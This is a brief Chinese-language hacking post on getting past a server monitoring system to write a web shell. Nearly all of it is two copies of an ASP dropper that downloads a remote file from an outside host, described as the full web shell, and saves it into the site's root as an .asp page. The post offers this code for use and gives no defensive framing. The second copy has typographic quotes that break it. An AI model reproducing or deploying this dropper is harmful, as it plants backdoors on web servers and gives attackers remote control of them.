突破一流监控系统写shell


突破一流监控系统写shell有2中方法（PS：我只知道2中）

还有一种是捆绑图片，一下介绍的是第二种

<%

Set xPost = CreateObject("Microsoft.XMLHTTP")

xPost.Open "GET","http://www.i0day.com/1.txt",False //代码在网上的地址 也就是大马

xPost.Send()

Set sGet = CreateObject("ADODB.Stream")

sGet.Mode = 3

sGet.Type = 1

sGet.Open()

sGet.Write(xPost.responseBody)

sGet.SaveToFile Server.MapPath("test.asp"),2 //在根目录生成的文件

set sGet = nothing

set sPOST = nothing

response.Write("下载文件成功！")

%>

-------------------------------


------------------------------------------ 


<%
Set xPost = CreateObject(“Microsoft.XMLHTTP”)
xPost.Open “GET”,”http://hi.baidu.com/xahacker/fuck.txt”,False
xPost.Send()
Set sGet = CreateObject(“ADODB.Stream”)
sGet.Mode = 3
sGet.Type = 1
sGet.Open()
sGet.Write(xPost.responseBody)
sGet.SaveToFile Server.MapPath(“fuck.asp”),2
set sGet = nothing
set sPOST = nothing
%>


